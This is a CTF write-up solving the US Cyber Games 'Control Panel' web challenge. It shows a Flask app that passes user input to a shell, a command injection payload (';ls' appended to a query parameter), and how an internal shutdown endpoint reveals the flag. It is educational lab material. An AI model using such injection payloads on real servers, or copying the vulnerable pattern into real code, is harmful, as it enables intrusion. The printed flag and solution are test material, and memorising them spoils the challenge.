# Control Panel

## Description

Control Panel [Web]

Agent, we've identified what appears to be ARIA's control panel. Luckily there's no authentication required to interact with it. Can you take down ARIA once and for all?

[https://uscybercombine-s4-control-panel.chals.io/](https://uscybercombine-s4-control-panel.chals.io/)

[control-panel.zip](https://ctfd.uscybergames.com/files/d610c5bfacbc496adf06f2207ee24a34/control-panel.zip?token=eyJ1c2VyX2lkIjozMDg2LCJ0ZWFtX2lkIjpudWxsLCJmaWxlX2lkIjoyNzV9.Zl3tig.qyARp0vI5Nivy8AFv9FptmBzKNg)

![Control Panel](/assets/ctf/uscybergames/control_panel.png)

## Solution

We are given source code:
```python
from flask import Flask, render_template, request
from subprocess import getoutput

app = Flask(__name__)

@app.route("/", methods=["GET"])
def index():
    command = request.args.get("command")
    if not command:
        return render_template("index.html")
    
    arg = request.args.get("arg")
    if not arg:
        arg = ""

    if command == "list_processes":
        return getoutput("ps")
    elif command == "list_connections":
        return getoutput("netstat -tulpn")
    elif command == "list_storage":
        return getoutput("df -h")
    elif command == "destroy_humans":
        return getoutput("/www/destroy_humans.sh " + arg)
    
    return render_template("index.html")
```

`destroy_humans` command introduces Command Injection vulnerability. Anything passed to `getoutput` get's executed as shell command. We can add `;` to add new command like `ls`:

view-source:https://uscybercombine-s4-control-panel.chals.io/?command=destroy_humans&arg=;ls
```bash
Destroy Humans option selected. Please choose 'check_status' or 'destroy_humans'.
challenge
destroy_humans.sh
run.py
```

There doesn't seem to be a flag on server, or rather it's in `/root`

**supervisord.conf**:
```ini
[supervisord]
user=root
nodaemon=true
logfile=/dev/null
logfile_maxbytes=0
pidfile=/run/supervisord.pid

[program:controlpanel]
command=python3 /www/run.py
autostart=true
user=guest
priority=1001
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0

[program:destroyer]
command=python3 /root/destroyer.py
autostart=true
user=root
priority=1001
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0
```

There are 2 applications, first is what we are connected to and second is server destroyer which is ran from root.

The app doesn't have access to `/root`
![Control Panel-1](/assets/ctf/uscybergames/control_panel-1.png)

**destroyer.py**:
```python
#!/usr/bin/env python3
import subprocess, json
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer

def get_json(content):
	return json.dumps(content).encode()

def http_server(host_port,content_type="application/json"):
	class CustomHandler(SimpleHTTPRequestHandler):
		def do_GET(self) -> None:
			def resp_ok():
				self.send_response(200)
				self.send_header("Content-type", content_type)
				self.end_headers()
			if self.path == '/status':
				resp_ok()
				self.wfile.write(get_json({'status': 'ready to destroy'}))
				return
			elif self.path == "/destroy":
				resp_ok()
				self.wfile.write(get_json({'status': "destruction complete!"}))
				return
			elif self.path == '/shutdown':
				resp_ok()
				self.wfile.write(get_json({'status': 'shutting down...'}))
				self.wfile.write(get_json({'status': 'SIVBGR{no-flag-4-u}'}))
				return
			self.send_error(404, '404 not found')
		def log_message(self, format, *args):
			pass
	class _TCPServer(TCPServer):
		allow_reuse_address = True
	httpd = _TCPServer(host_port, CustomHandler)
	httpd.serve_forever()

http_server(('127.0.0.1',3000))
```

`http://127.0.0.1:3000/shutdown` should give us a flag

![Control Panel-2](/assets/ctf/uscybergames/control_panel-2.png)
::: tip Flag
`**SIVBGR{g00dby3_ARI4}**`
:::
